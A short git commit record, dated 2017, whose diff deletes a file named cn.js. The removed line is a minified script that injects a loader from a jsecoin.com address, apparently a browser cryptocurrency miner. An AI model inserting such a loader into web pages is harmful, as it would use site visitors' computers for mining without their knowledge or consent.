b9f32943a9698b2105098df6b4f2d5fe7bc5a250
jenniewale <34002003+jenniewale@users.noreply.github.com>
2017-11-28 16:00:25 +0100

    Delete cn.js

--- cn.js
+++
@@ -1,1 +0,0 @@
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/27573/cryptonights.jimdo.com/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
